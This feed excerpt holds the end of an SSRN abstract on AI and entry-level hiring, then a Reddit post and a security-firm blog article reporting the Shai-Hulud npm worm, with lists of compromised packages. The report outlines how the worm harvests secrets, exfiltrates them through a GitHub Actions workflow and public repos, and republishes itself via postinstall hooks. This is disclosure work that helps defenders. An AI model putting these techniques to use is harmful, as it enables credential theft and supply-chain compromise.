U-shaped pattern: mid-tier graduates see the largest declines, while elite and low-tier graduates are less affected. Overall, the results provide early evidence of a seniority-biased impact of AI adoption and its mechanisms. </p></div><center> </center><p><strong>Keywords:</strong> Generative AI, Technological Change, Generative Artificial Intelligence, Labor Market, AI Adoption, Job Postings, R&eacute;sum&eacute; Data, Career Ladders, Entry-Level Employment, United States labor market</p><p><strong>JEL Classification:</strong> J24, J31, J63, O33, L23</p><p><strong>Suggested Citation:</strong> <a href="https://papers.ssrn.com#">Suggested Citation<i></i></a> </p><p>Lichtinger, Guy and Hosseini Maasoum, Seyed Mahdi and Hosseini Maasoum, Seyed Mahdi, Generative AI as Seniority-Biased Technological Change: Evidence from U.S. R&eacute;sum&eacute; and Job Posting Data (August 31, 2025). Available at SSRN: <a href="https://ssrn.com/abstract=5425555">https://ssrn.com/abstract=5425555</a> or <a href="https://dx.doi.org/10.2139/ssrn.5425555">http://dx.doi.org/10.2139/ssrn.5425555 </a> </p></div></section>]]></description><pubDate>Tue, 16 Sep 2025 20:44:33 +0530</pubDate></item><item><link>https://www.aikido.dev/blog/s1ngularity-nx-attackers-strike-again</link><title>Crowdstrike Packages Infected with Malware (and other 167 packages infected as well) (aikido.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nihrpt/crowdstrike_packages_infected_with_malware_and/</guid><comments>https://www.reddit.com/r/programming/comments/1nihrpt/crowdstrike_packages_infected_with_malware_and/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 19 min | <a href='https://www.reddit.com/r/programming/comments/1nihrpt/crowdstrike_packages_infected_with_malware_and/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>sigh.... Kinda getting sick of writing these, absolutely insane the pace of supply chain attacks anyway...<br/>The same ThreatActors behind the NX S1ngularity attack have launched a self-replicating worm, it&#39;s infected 187 packages and its terrifying.</p><p>Yesterday a software developer  <a href="https://www.linkedin.com/in/daniel-pereira-b17a27160/">Daniel Pereira </a>noticed a weird repo being created.... when he looked into it he was the first to realize that actually <a href="https://www.npmjs.com/package/@ctrl/tinycolor">tinycolor </a>was infected with malware. He reached out to multiple people, no one took him seriously until he reached out to Socket who discovered that <a href="https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages">40 packages were compromised</a>.</p><p>Fun story, a little concerning but honestly this happens a lot so it&#39;s not crazy.... But then it got worse, so much worse.</p><p>When I woke up, our lead researcher Charlie Erikson had discovered that actually a total of 187 packages were compromised (147 more than Socket had reported) 20 of which were from Crowdstrike.</p><p>What does the worm do</p><ul><li><strong>Harvest</strong>: scans the host and CI environment for secrets — process.env, scanning with TruffleHog, and cloud metadata endpoints (AWS/GCP) that return instance/service credentials.</li><li><strong>Exfiltrate (1) — GitHub repo</strong>: creates a repo named <strong>Shai-Hulud</strong> under the compromised account and commits a JSON dump containing system info, environment variables, and collected secrets.</li><li><strong>Exfiltrate (2) — GitHub Actions → webhook</strong>: drops a workflow <code>.github/workflows/shai-hulud-workflow.yml</code> that serializes <code>${{ toJSON(secrets) }}</code>, POSTs them to an attacker <code>webhook[.]site</code> URL and writes a double-base64 copy into the Actions logs.</li><li><strong>Propagate</strong>: uses any valid npm tokens it finds to enumerate and attempt to update packages the compromised maintainer controls (supply-chain propagation).</li><li><strong>Amplify</strong>: iterates the victim’s accessible repositories, making them public or adding the workflow/branch that will trigger further runs and leaks.</li></ul><p>Its already turned <a href="https://github.com/search?q=Shai-Hulud+Migration&amp;ref=opensearch&amp;type=repositories&amp;s=updated&amp;o=asc">700 previously private repositories public</a>  This number will go down as they are removed by maintainers</p><p>if you remeber the S1ngularity breach this is the exact same type of attacker and 100% the same attackers.</p><p>The questions I have from that attack remain.... I have no idea why they are exfiltrating secrets to Public GitHub repos and not a private C2 servers (other than to cause chaos)</p><p>The malicious versions have since been removed by Crowdstrikes account. Here is a total list of the packages compromised and their versions</p><table><thead><tr><th>@ahmedhfarag/ngx-perfect-scrollbar</th><th>20.0.20</th></tr></thead><tbody><tr><td>@ahmedhfarag/ngx-virtual-scroller</td><td>4.0.4</td></tr><tr><td>@art-ws/common</td><td>2.0.28</td></tr><tr><td>@art-ws/config-eslint</td><td>2.0.4, 2.0.5</td></tr><tr><td>@art-ws/config-ts</td><td>2.0.7, 2.0.8</td></tr><tr><td>@art-ws/db-context</td><td>2.0.24</td></tr><tr><td>@art-ws/di</td><td>2.0.28, 2.0.32</td></tr><tr><td>@art-ws/di-node</td><td>2.0.13</td></tr><tr><td>@art-ws/eslint</td><td>1.0.5, 1.0.6</td></tr><tr><td>@art-ws/fastify-http-server</td><td>2.0.24, 2.0.27</td></tr><tr><td>@art-ws/http-server</td><td>2.0.21, 2.0.25</td></tr><tr><td>@art-ws/openapi</td><td>0.1.9, 0.1.12</td></tr><tr><td>@art-ws/package-base</td><td>1.0.5, 1.0.6</td></tr><tr><td>@art-ws/prettier</td><td>1.0.5, 1.0.6</td></tr><tr><td>@art-ws/slf</td><td>2.0.15, 2.0.22</td></tr><tr><td>@art-ws/ssl-info</td><td>1.0.9, 1.0.10</td></tr><tr><td>@art-ws/web-app</td><td>1.0.3, 1.0.4</td></tr><tr><td>@crowdstrike/commitlint</td><td>8.1.1, 8.1.2</td></tr><tr><td>@crowdstrike/falcon-shoelace</td><td>0.4.1, 0.4.2</td></tr><tr><td>@crowdstrike/foundry-js</td><td>0.19.1, 0.19.2</td></tr><tr><td>@crowdstrike/glide-core</td><td>0.34.2, 0.34.3</td></tr><tr><td>@crowdstrike/logscale-dashboard</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/logscale-file-editor</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/logscale-parser-edit</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/logscale-search</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/tailwind-toucan-base</td><td>5.0.1, 5.0.2</td></tr><tr><td>@ctrl/deluge</td><td>7.2.1, 7.2.2</td></tr><tr><td>@ctrl/golang-template</td><td>1.4.2, 1.4.3</td></tr><tr><td>@ctrl/magnet-link</td><td>4.0.3, 4.0.4</td></tr><tr><td>@ctrl/ngx-codemirror</td><td>7.0.1, 7.0.2</td></tr><tr><td>@ctrl/ngx-csv</td><td>6.0.1, 6.0.2</td></tr><tr><td>@ctrl/ngx-emoji-mart</td><td>9.2.1, 9.2.2</td></tr><tr><td>@ctrl/ngx-rightclick</td><td>4.0.1, 4.0.2</td></tr><tr><td>@ctrl/qbittorrent</td><td>9.7.1, 9.7.2</td></tr><tr><td>@ctrl/react-adsense</td><td>2.0.1, 2.0.2</td></tr><tr><td>@ctrl/shared-torrent</td><td>6.3.1, 6.3.2</td></tr><tr><td>@ctrl/tinycolor</td><td>4.1.1, 4.1.2</td></tr><tr><td>@ctrl/torrent-file</td><td>4.1.1, 4.1.2</td></tr><tr><td>@ctrl/transmission</td><td>7.3.1</td></tr><tr><td>@ctrl/ts-base32</td><td>4.0.1, 4.0.2</td></tr><tr><td>@hestjs/core</td><td>0.2.1</td></tr><tr><td>@hestjs/cqrs</td><td>0.1.6</td></tr><tr><td>@hestjs/demo</td><td>0.1.2</td></tr><tr><td>@hestjs/eslint-config</td><td>0.1.2</td></tr><tr><td>@hestjs/logger</td><td>0.1.6</td></tr><tr><td>@hestjs/scalar</td><td>0.1.7</td></tr><tr><td>@hestjs/validation</td><td>0.1.6</td></tr><tr><td>@nativescript-community/arraybuffers</td><td>1.1.6, 1.1.7, 1.1.8</td></tr><tr><td>@nativescript-community/gesturehandler</td><td>2.0.35</td></tr><tr><td>@nativescript-community/perms</td><td>3.0.5, 3.0.6, 3.0.7, 3.0.8</td></tr><tr><td>@nativescript-community/sqlite</td><td>3.5.2, 3.5.3, 3.5.4, 3.5.5</td></tr><tr><td>@nativescript-community/text</td><td>1.6.9, 1.6.10, 1.6.11, 1.6.12</td></tr><tr><td>@nativescript-community/typeorm</td><td>0.2.30, 0.2.31, 0.2.32, 0.2.33</td></tr><tr><td>@nativescript-community/ui-collectionview</td><td>6.0.6</td></tr><tr><td>@nativescript-community/ui-document-picker</td><td>1.1.27, 1.1.28</td></tr><tr><td>@nativescript-community/ui-drawer</td><td>0.1.30</td></tr><tr><td>@nativescript-community/ui-image</td><td>4.5.6</td></tr><tr><td>@nativescript-community/ui-label</td><td>1.3.35, 1.3.36, 1.3.37</td></tr><tr><td>@nativescript-community/ui-material-bottom-navigation</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-bottomsheet</td><td>7.2.72</td></tr><tr><td>@nativescript-community/ui-material-core</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-core-tabs</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-ripple</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-tabs</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-pager</td><td>14.1.36, 14.1.37, 14.1.38</td></tr><tr><td>@nativescript-community/ui-pulltorefresh</td><td>2.5.4, 2.5.5, 2.5.6, 2.5.7</td></tr><tr><td>@nexe/config-manager</td><td>0.1.1</td></tr><tr><td>@nexe/eslint-config</td><td>0.1.1</td></tr><tr><td>@nexe/logger</td><td>0.1.3</td></tr><tr><td>@nstudio/angular</td><td>20.0.4, 20.0.5, 20.0.6</td></tr><tr><td>@nstudio/focus</td><td>20.0.4, 20.0.5, 20.0.6</td></tr><tr><td>@nstudio/nativescript-checkbox</td><td>2.0.6, 2.0.7, 2.0.8, 2.0.9</td></tr><tr><td>@nstudio/nativescript-loading-indicator</td><td>5.0.1, 5.0.2, 5.0.3, 5.0.4</td></tr><tr><td>@nstudio/ui-collectionview</td><td>5.1.11, 5.1.12, 5.1.13, 5.1.14</td></tr><tr><td>@nstudio/web</td><td>20.0.4</td></tr><tr><td>@nstudio/web-angular</td><td>20.0.4</td></tr><tr><td>@nstudio/xplat</td><td>20.0.5, 20.0.6, 20.0.7</td></tr><tr><td>@nstudio/xplat-utils</td><td>20.0.5, 20.0.6, 20.0.7</td></tr><tr><td>@operato/board</td><td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/data-grist</td><td>9.0.29, 9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/graphql</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/headroom</td><td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/help</td><td>9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/i18n</td><td>9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/input</td><td>9.0.27, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/layout</td><td>9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/popup</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/pull-to-refresh</td><td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42</td></tr><tr><td>@operato/shell</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39</td></tr><tr><td>@operato/styles</td><td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/utils</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@teselagen/bounce-loader</td><td>0.3.16, 0.3.17</td></tr><tr><td>@teselagen/liquibase-tools</td><td>0.4.1</td></tr><tr><td>@teselagen/range-utils</td><td>0.3.14, 0.3.15</td></tr><tr><td>@teselagen/react-list</td><td>0.8.19, 0.8.20</td></tr><tr><td>@teselagen/react-table</td><td>6.10.19</td></tr><tr><td>@thangved/callback-window</td><td>1.1.4</td></tr><tr><td>@things-factory/attachment-base</td><td>9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50</td></tr><tr><td>@things-factory/auth-base</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/email-base</td><td>9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50, 9.0.51, 9.0.52, 9.0.53, 9.0.54</td></tr><tr><td>@things-factory/env</td><td>9.0.42, 9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/integration-base</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/integration-marketplace</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/shell</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@tnf-dev/api</td><td>1.0.8</td></tr><tr><td>@tnf-dev/core</td><td>1.0.8</td></tr><tr><td>@tnf-dev/js</td><td>1.0.8</td></tr><tr><td>@tnf-dev/mui</td><td>1.0.8</td></tr><tr><td>@tnf-dev/react</td><td>1.0.8</td></tr><tr><td>@ui-ux-gang/devextreme-angular-rpk</td><td>24.1.7</td></tr><tr><td>@yoobic/design-system</td><td>6.5.17</td></tr><tr><td>@yoobic/jpeg-camera-es6</td><td>1.0.13</td></tr><tr><td>@yoobic/yobi</td><td>8.7.53</td></tr><tr><td>airchief</td><td>0.3.1</td></tr><tr><td>airpilot</td><td>0.8.8</td></tr><tr><td>angulartics2</td><td>14.1.1, 14.1.2</td></tr><tr><td>browser-webdriver-downloader</td><td>3.0.8</td></tr><tr><td>capacitor-notificationhandler</td><td>0.0.2, 0.0.3</td></tr><tr><td>capacitor-plugin-healthapp</td><td>0.0.2, 0.0.3</td></tr><tr><td>capacitor-plugin-ihealth</td><td>1.1.8, 1.1.9</td></tr><tr><td>capacitor-plugin-vonage</td><td>1.0.2, 1.0.3</td></tr><tr><td>capacitorandroidpermissions</td><td>0.0.4, 0.0.5</td></tr><tr><td>config-cordova</td><td>0.8.5</td></tr><tr><td>cordova-plugin-voxeet2</td><td>1.0.24</td></tr><tr><td>cordova-voxeet</td><td>1.0.32</td></tr><tr><td>create-hest-app</td><td>0.1.9</td></tr><tr><td>db-evo</td><td>1.1.4, 1.1.5</td></tr><tr><td>devextreme-angular-rpk</td><td>21.2.8</td></tr><tr><td>ember-browser-services</td><td>5.0.2, 5.0.3</td></tr><tr><td>ember-headless-form</td><td>1.1.2, 1.1.3</td></tr><tr><td>ember-headless-form-yup</td><td>1.0.1</td></tr><tr><td>ember-headless-table</td><td>2.1.5, 2.1.6</td></tr><tr><td>ember-url-hash-polyfill</td><td>1.0.12, 1.0.13</td></tr><tr><td>ember-velcro</td><td>2.2.1, 2.2.2</td></tr><tr><td>encounter-playground</td><td>0.0.2, 0.0.3, 0.0.4, 0.0.5</td></tr><tr><td>eslint-config-crowdstrike</td><td>11.0.2, 11.0.3</td></tr><tr><td>eslint-config-crowdstrike-node</td><td>4.0.3, 4.0.4</td></tr><tr><td>eslint-config-teselagen</td><td>6.1.7</td></tr><tr><td>globalize-rpk</td><td>1.7.4</td></tr><tr><td>graphql-sequelize-teselagen</td><td>5.3.8</td></tr><tr><td>html-to-base64-image</td><td>1.0.2</td></tr><tr><td>json-rules-engine-simplified</td><td>0.2.1</td></tr><tr><td>jumpgate</td><td>0.0.2</td></tr><tr><td>koa2-swagger-ui</td><td>5.11.1, 5.11.2</td></tr><tr><td>mcfly-semantic-release</td><td>1.3.1</td></tr><tr><td>mcp-knowledge-base</td><td>0.0.2</td></tr><tr><td>mcp-knowledge-graph</td><td>1.2.1</td></tr><tr><td>mobioffice-cli</td><td>1.0.3</td></tr><tr><td>monorepo-next</td><td>13.0.1, 13.0.2</td></tr><tr><td>mstate-angular</td><td>0.4.4</td></tr><tr><td>mstate-cli</td><td>0.4.7</td></tr><tr><td>mstate-dev-react</td><td>1.1.1</td></tr><tr><td>mstate-react</td><td>1.6.5</td></tr><tr><td>ng2-file-upload</td><td>7.0.2, 7.0.3, 8.0.1, 8.0.2, 8.0.3, 9.0.1</td></tr><tr><td>ngx-bootstrap</td><td>18.1.4, 19.0.3, 19.0.4, 20.0.3, 20.0.4, 20.0.5</td></tr><tr><td>ngx-color</td><td>10.0.1, 10.0.2</td></tr><tr><td>ngx-toastr</td><td>19.0.1, 19.0.2</td></tr><tr><td>ngx-trend</td><td>8.0.1</td></tr><tr><td>ngx-ws</td><td>1.1.5, 1.1.6</td></tr><tr><td>oradm-to-gql</td><td>35.0.14, 35.0.15</td></tr><tr><td>oradm-to-sqlz</td><td>1.1.2</td></tr><tr><td>ove-auto-annotate</td><td>0.0.9</td></tr><tr><td>pm2-gelf-json</td><td>1.0.4, 1.0.5</td></tr><tr><td>printjs-rpk</td><td>1.6.1</td></tr><tr><td>react-complaint-image</td><td>0.0.32</td></tr><tr><td>react-jsonschema-form-conditionals</td><td>0.3.18</td></tr><tr><td>remark-preset-lint-crowdstrike</td><td>4.0.1, 4.0.2</td></tr><tr><td>rxnt-authentication</td><td>0.0.3, 0.0.4, 0.0.5, 0.0.6</td></tr><tr><td>rxnt-healthchecks-nestjs</td><td>1.0.2, 1.0.3, 1.0.4, 1.0.5</td></tr><tr><td>rxnt-kue</td><td>1.0.4, 1.0.5, 1.0.6, 1.0.7</td></tr><tr><td>swc-plugin-component-annotate</td><td>1.9.1, 1.9.2</td></tr><tr><td>tbssnch</td><td>1.0.2</td></tr><tr><td>teselagen-interval-tree</td><td>1.1.2</td></tr><tr><td>tg-client-query-builder</td><td>2.14.4, 2.14.5</td></tr><tr><td>tg-redbird</td><td>1.3.1</td></tr><tr><td>tg-seq-gen</td><td>1.0.9, 1.0.10</td></tr><tr><td>thangved-react-grid</td><td>1.0.3</td></tr><tr><td>ts-gaussian</td><td>3.0.5, 3.0.6</td></tr><tr><td>ts-imports</td><td>1.0.1, 1.0.2</td></tr><tr><td>tvi-cli</td><td>0.1.5</td></tr><tr><td>ve-bamreader</td><td>0.2.6</td></tr><tr><td>ve-editor</td><td>1.0.1</td></tr><tr><td>verror-extra</td><td>6.0.1</td></tr><tr><td>voip-callkit</td><td>1.0.2, 1.0.3</td></tr><tr><td>wdio-web-reporter</td><td>0.1.3</td></tr><tr><td>yargs-help-output</td><td>5.0.3</td></tr><tr><td>yoo-styles</td><td>6.0.326</td></tr></tbody></table></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c936379bfcdd38371b2acc_Group%202147255852.png' /></section><section class='parsed-content'><div><div><div><div><p>Published on:</p><p>September 16, 2025</p></div><div><p>Last updated on:</p><p>September 16, 2025</p></div></div><div><p>This morning, we were alerted to a large-scale attack against npm. This appears to the be work of the same threat actors behind the Nx attack on August 27th 2025.&nbsp;This was originally published by <a href="https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages">Socket</a> and <a href="https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised">StepSecurity</a> who noted 40 packages had been comrpomised, since then an additional 147 packages have been infected with malware including packages from CrowdStrike. </p><p>The scale, scope and impact of this attack is significant. The attackers are using the same playbook in large parts as the original attack, but have stepped up their game. They have turned it into a full worm, which does these things automatically:</p><ul><li>Steal secrets and publish them to GitHub publicly</li><li>Run trufflehog and query Cloud metadata endpoints to gather secrets</li><li>Attempt to create a new GitHub action with a data exiltration mechanism through webhook[.]site</li><li>Iterate the repositories on GitHub a user has access to, and make them public<br></li></ul><p>Since our initial alert this morning we&rsquo;ve confirmed the following additional behaviours and important details. For those that don't know, Shai&nbsp;Hulud is the name for the worm in the Dune franchise. A clear indication of the intent of the attackers.</p><figure><figcaption><em>Shai&nbsp;Hulud, from Dune</em></figcaption></figure><p>To avoid being compromised by packages like this, check out Aikido <a href="https://www.aikido.dev/blog/introducing-safe-chain">safe-chain</a>!</p><h2>What the worm does </h2><ul><li><strong>Harvest</strong>: scans the host and CI environment for secrets &mdash; process.env, scanning with TruffleHog, and cloud metadata endpoints (AWS/GCP) that return instance/service credentials.<br></li><li><strong>Exfiltrate (1) &mdash; GitHub repo</strong>: creates a repo named <strong>Shai-Hulud</strong> under the compromised account and commits a JSON dump containing system info, environment variables, and collected secrets.<br></li><li><strong>Exfiltrate (2) &mdash; GitHub Actions &rarr; webhook</strong>: drops a workflow <code>.github/workflows/shai-hulud-workflow.yml</code> that serializes <code>${{ toJSON(secrets) }}</code>, POSTs them to an attacker <code>webhook[.]site</code> URL and writes a double-base64 copy into the Actions logs.<br></li><li><strong>Propagate</strong>: uses any valid npm tokens it finds to enumerate and attempt to update packages the compromised maintainer controls (supply-chain propagation).<br></li><li><strong>Amplify</strong>: iterates the victim&rsquo;s accessible repositories, making them public or adding the workflow/branch that will trigger further runs and leaks.</li></ul><p>&zwj;</p><h2>Leaking of secrets</h2><p>As with the original Nx attack, we're seeing the attackers doing a smash-and-grab style attack. The malicous payload both publishes a "Shai-Hulud"&nbsp;repository with stolen credentials/tokens, and it will go through a GitHub account and turn private repository to public:</p><p>&zwj;</p><figure><figcaption><em>Stolen credentials being published</em></figcaption></figure><p>&zwj;</p><figure><figcaption><em>Private repositories being turned public</em></figcaption></figure><p>&zwj;</p><h2>Self-propogation through npm</h2><p>One of the most striking features of this attack is that it behaves like a <strong>true worm</strong>. Rather than relying on a single infected package to spread, the code is designed to <strong>re-publish itself into other npm packages</strong> owned by the compromised maintainer.</p><p>Here&rsquo;s how the worm logic works:</p><ul><li><strong>Download a target tarball</strong> &ndash; it fetches an existing package version from the npm registry.</li><li><strong>Modify <code>package.json</code></strong> &ndash; the worm bumps the patch version (e.g. <code>1.2.3 &rarr; 1.2.4</code>) and inserts a new lifecycle hook&nbsp;(<code>postinstall</code>)<code>&zwj;</code></li><li><strong>Copy its own payload</strong> &ndash; the running script (<code>process.argv[1]</code>) is written into the tarball as <code>bundle.js</code>. This ensures that whatever code infected one package now lives inside the next.</li><li><strong>Re-publish the trojanized package</strong> &ndash; the modified tarball is gzipped and pushed back to npm using the maintainer&rsquo;s credentials.</li></ul><p>This cycle allows the malware to <strong>continuously infect every package</strong> a maintainer has access to. Each published package becomes a new distribution vector: as soon as someone installs it, the worm executes, replicates, and pushes itself further into the ecosystem.</p><p>In short: the attacker doesn&rsquo;t need to manually target packages. Once a single environment is compromised, the worm automates the spread by <strong>piggybacking on the maintainer&rsquo;s own publishing rights</strong>.</p><h2>Impacted packages</h2><div><table> <thead> <tr> <th>Package</th> <th>Versions</th> </tr> </thead> <tbody> <tr> <td>@ahmedhfarag/ngx-perfect-scrollbar</td> <td>20.0.20</td> </tr> <tr> <td>@ahmedhfarag/ngx-virtual-scroller</td> <td>4.0.4</td> </tr> <tr> <td>@art-ws/common</td> <td>2.0.28</td> </tr> <tr> <td>@art-ws/config-eslint</td> <td>2.0.4, 2.0.5</td> </tr> <tr> <td>@art-ws/config-ts</td> <td>2.0.7, 2.0.8</td> </tr> <tr> <td>@art-ws/db-context</td> <td>2.0.24</td> </tr> <tr> <td>@art-ws/di</td> <td>2.0.28, 2.0.32</td> </tr> <tr> <td>@art-ws/di-node</td> <td>2.0.13</td> </tr> <tr> <td>@art-ws/eslint</td> <td>1.0.5, 1.0.6</td> </tr> <tr> <td>@art-ws/fastify-http-server</td> <td>2.0.24, 2.0.27</td> </tr> <tr> <td>@art-ws/http-server</td> <td>2.0.21, 2.0.25</td> </tr> <tr> <td>@art-ws/openapi</td> <td>0.1.9, 0.1.12</td> </tr> <tr> <td>@art-ws/package-base</td> <td>1.0.5, 1.0.6</td> </tr> <tr> <td>@art-ws/prettier</td> <td>1.0.5, 1.0.6</td> </tr> <tr> <td>@art-ws/slf</td> <td>2.0.15, 2.0.22</td> </tr> <tr> <td>@art-ws/ssl-info</td> <td>1.0.9, 1.0.10</td> </tr> <tr> <td>@art-ws/web-app</td> <td>1.0.3, 1.0.4</td> </tr> <tr> <td>@crowdstrike/commitlint</td> <td>8.1.1, 8.1.2</td> </tr> <tr> <td>@crowdstrike/falcon-shoelace</td> <td>0.4.1, 0.4.2</td> </tr> <tr> <td>@crowdstrike/foundry-js</td> <td>0.19.1, 0.19.2</td> </tr> <tr> <td>@crowdstrike/glide-core</td> <td>0.34.2, 0.34.3</td> </tr> <tr> <td>@crowdstrike/logscale-dashboard</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/logscale-file-editor</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/logscale-parser-edit</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/logscale-search</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/tailwind-toucan-base</td> <td>5.0.1, 5.0.2</td> </tr> <tr> <td>@ctrl/deluge</td> <td>7.2.1, 7.2.2</td> </tr> <tr> <td>@ctrl/golang-template</td> <td>1.4.2, 1.4.3</td> </tr> <tr> <td>@ctrl/magnet-link</td> <td>4.0.3, 4.0.4</td> </tr> <tr> <td>@ctrl/ngx-codemirror</td> <td>7.0.1, 7.0.2</td> </tr> <tr> <td>@ctrl/ngx-csv</td> <td>6.0.1, 6.0.2</td> </tr> <tr> <td>@ctrl/ngx-emoji-mart</td> <td>9.2.1, 9.2.2</td> </tr> <tr> <td>@ctrl/ngx-rightclick</td> <td>4.0.1, 4.0.2</td> </tr> <tr> <td>@ctrl/qbittorrent</td> <td>9.7.1, 9.7.2</td> </tr> <tr> <td>@ctrl/react-adsense</td> <td>2.0.1, 2.0.2</td> </tr> <tr> <td>@ctrl/shared-torrent</td> <td>6.3.1, 6.3.2</td> </tr> <tr> <td>@ctrl/tinycolor</td> <td>4.1.1, 4.1.2</td> </tr> <tr> <td>@ctrl/torrent-file</td> <td>4.1.1, 4.1.2</td> </tr> <tr> <td>@ctrl/transmission</td> <td>7.3.1</td> </tr> <tr> <td>@ctrl/ts-base32</td> <td>4.0.1, 4.0.2</td> </tr> <tr> <td>@hestjs/core</td> <td>0.2.1</td> </tr> <tr> <td>@hestjs/cqrs</td> <td>0.1.6</td> </tr> <tr> <td>@hestjs/demo</td> <td>0.1.2</td> </tr> <tr> <td>@hestjs/eslint-config</td> <td>0.1.2</td> </tr> <tr> <td>@hestjs/logger</td> <td>0.1.6</td> </tr> <tr> <td>@hestjs/scalar</td> <td>0.1.7</td> </tr> <tr> <td>@hestjs/validation</td> <td>0.1.6</td> </tr> <tr> <td>@nativescript-community/arraybuffers</td> <td>1.1.6, 1.1.7, 1.1.8</td> </tr> <tr> <td>@nativescript-community/gesturehandler</td> <td>2.0.35</td> </tr> <tr> <td>@nativescript-community/perms</td> <td>3.0.5, 3.0.6, 3.0.7, 3.0.8</td> </tr> <tr> <td>@nativescript-community/sqlite</td> <td>3.5.2, 3.5.3, 3.5.4, 3.5.5</td> </tr> <tr> <td>@nativescript-community/text</td> <td>1.6.9, 1.6.10, 1.6.11, 1.6.12</td> </tr> <tr> <td>@nativescript-community/typeorm</td> <td>0.2.30, 0.2.31, 0.2.32, 0.2.33</td> </tr> <tr> <td>@nativescript-community/ui-collectionview</td> <td>6.0.6</td> </tr> <tr> <td>@nativescript-community/ui-document-picker</td> <td>1.1.27, 1.1.28</td> </tr> <tr> <td>@nativescript-community/ui-drawer</td> <td>0.1.30</td> </tr> <tr> <td>@nativescript-community/ui-image</td> <td>4.5.6</td> </tr> <tr> <td>@nativescript-community/ui-label</td> <td>1.3.35, 1.3.36, 1.3.37</td> </tr> <tr> <td>@nativescript-community/ui-material-bottom-navigation</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-bottomsheet</td> <td>7.2.72</td> </tr> <tr> <td>@nativescript-community/ui-material-core</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-core-tabs</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-ripple</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-tabs</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-pager</td> <td>14.1.36, 14.1.37, 14.1.38</td> </tr> <tr> <td>@nativescript-community/ui-pulltorefresh</td> <td>2.5.4, 2.5.5, 2.5.6, 2.5.7</td> </tr> <tr> <td>@nexe/config-manager</td> <td>0.1.1</td> </tr> <tr> <td>@nexe/eslint-config</td> <td>0.1.1</td> </tr> <tr> <td>@nexe/logger</td> <td>0.1.3</td> </tr> <tr> <td>@nstudio/angular</td> <td>20.0.4, 20.0.5, 20.0.6</td> </tr> <tr> <td>@nstudio/focus</td> <td>20.0.4, 20.0.5, 20.0.6</td> </tr> <tr> <td>@nstudio/nativescript-checkbox</td> <td>2.0.6, 2.0.7, 2.0.8, 2.0.9</td> </tr> <tr> 